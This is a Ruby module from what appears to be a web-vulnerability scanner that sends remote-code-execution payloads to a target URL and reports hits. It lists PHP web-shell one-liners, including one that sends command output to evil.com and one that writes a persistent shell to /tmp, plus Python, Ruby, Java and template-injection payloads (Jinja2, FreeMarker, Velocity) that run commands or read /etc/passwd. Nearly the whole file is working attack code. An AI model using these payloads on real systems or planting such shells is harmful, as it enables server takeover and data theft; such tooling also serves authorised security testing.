require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class RCE
  PHP_PAYLOADS = [
    '<?php system($_GET["cmd"]); ?>',
    '<?php exec($_GET["cmd"]); ?>',
    '<?php shell_exec($_GET["cmd"]); ?>',
    '<?php passthru($_GET["cmd"]); ?>',
    '<?php `$_GET["cmd"]`; ?>',
    '<?php eval($_GET["cmd"]); ?>',
    '<?php assert($_GET["cmd"]); ?>',
    '<?php file_get_contents("http://evil.com/?".$_GET["cmd"]); ?>',
    '<?php file_put_contents("/tmp/rce.php", "<?php system($_GET[\"cmd\"]); ?>"); ?>',
    '<?php system($_POST["cmd"]); ?>',
    '<?php exec($_POST["cmd"]); ?>',
    '<?php shell_exec($_POST["cmd"]); ?>',
    '<?php passthru($_POST["cmd"]); ?>',
    '<?php `$_POST["cmd"]`; ?>',
    '<?php eval($_POST["cmd"]); ?>',
    '<?php assert($_POST["cmd"]); ?>'
  ]

  PYTHON_PAYLOADS = [
    '__import__("os").system("id")',
    '__import__("os").popen("id").read()',
    'eval("__import__(\'os\').system(\'id\')")',
    'exec("__import__(\'os\').system(\'id\')")',
    '__import__("subprocess").call("id", shell=True)',
    '__import__("subprocess").check_output("id", shell=True)',
    '[x for x in (1).__class__.__bases__[0].__subclasses__() if "warning" in x.__name__][0]()._module.__builtins__["__import__"]("os").system("id")'
  ]

  RUBY_PAYLOADS = [
    '`id`',
    'system("id")',
    'exec("id")',
    'Kernel.exec("id")',
    'IO.popen("id").read',
    'open("|id").read',
    'eval("system(\'id\')")'
  ]

  JAVA_PAYLOADS = [
    'Runtime.getRuntime().exec("id")',
    'ProcessBuilder("id").start()',
    'new ProcessBuilder("id").start()',
    'Runtime.getRuntime().exec(new String[]{"id"})',
    'Process p = Runtime.getRuntime().exec("id");'
  ]

  def self.test_php_rce(url, parameter = 'cmd')
    vulnerable = false
    
    PHP_PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && (response.body.include?('uid=') || response.body.include?('gid=') || response.body.include?('root'))
          puts Colorize.red("PHP RCE vulnerability found!")
          puts Colorize.yellow("Payload: #{payload}")
          vulnerable = true
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_python_rce(url, parameter = 'cmd')
    vulnerable = false
    
    PYTHON_PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && (response.body.include?('uid=') || response.body.include?('gid='))
          puts Colorize.red("Python RCE vulnerability found!")
          puts Colorize.yellow("Payload: #{payload}")
          vulnerable = true
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_ruby_rce(url, parameter = 'cmd')
    vulnerable = false
    
    RUBY_PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && (response.body.include?('uid=') || response.body.include?('gid='))
          puts Colorize.red("Ruby RCE vulnerability found!")
          puts Colorize.yellow("Payload: #{payload}")
          vulnerable = true
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_java_rce(url, parameter = 'cmd')
    vulnerable = false
    
    JAVA_PAYLOADS.each do |payload|
      begin
        test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        
        if response && response.code.to_i != 500
          puts Colorize.yellow("Testing Java RCE: #{payload}")
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_template_injection_rce(url, parameter = 'template')
    template_payloads = {
      jinja2: [
        '{{config.__class__.__init__.__globals__["os"].system("id")}}',
        '{{self.__init__.__globals__.__builtins__.__import__("os").system("id")}}',
        '{{"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}'
      ],
      freemarker: [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '${"freemarker.template.utility.Execute"?new()("id")}'
      ],
      velocity: [
        '#set($exec="id")${exec}',
        '#set($x=$class.forName("java.lang.Runtime"))#set($rt=$x.getRuntime())$rt.exec("id")'
      ]
    }
    
    results = {}
    
    template_payloads.each do |engine, payloads|
      payloads.each do |payload|
        begin
          test_url = url.include?('?') ? "#{url}&#{parameter}=#{URI.encode_www_form_component(payload)}" : "#{url}?#{parameter}=#{URI.encode_www_form_component(payload)}"
          response = Network.http_request(test_url)
          
          if response && (response.body.include?('uid=') || response.body.include?('gid='))
            puts Colorize.red("#{engine.to_s.upcase} RCE found!")
            results[engine] = true
          end
        rescue => e
        end
      end
    end
    
    results
  end
end

